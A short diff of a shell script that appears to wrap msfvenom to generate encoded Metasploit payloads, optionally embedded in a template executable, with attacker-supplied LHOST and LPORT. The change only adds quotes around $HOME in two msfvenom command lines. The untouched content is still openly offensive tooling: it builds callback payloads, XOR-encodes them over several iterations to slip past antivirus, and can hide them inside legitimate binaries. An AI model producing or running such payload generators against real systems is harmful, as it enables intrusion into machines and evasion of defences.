@@ -198,8 +198,8 @@ if [ "$ANSWER" == "y" ]; then
     fi
 
     echo
-    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o $HOME/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
+    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o "$HOME"/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
 else
     echo
-    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o $HOME/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
+    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o "$HOME"/data/"$X"-"$LPORT"-"$ITERATIONS""$EXTENTION"
 fi
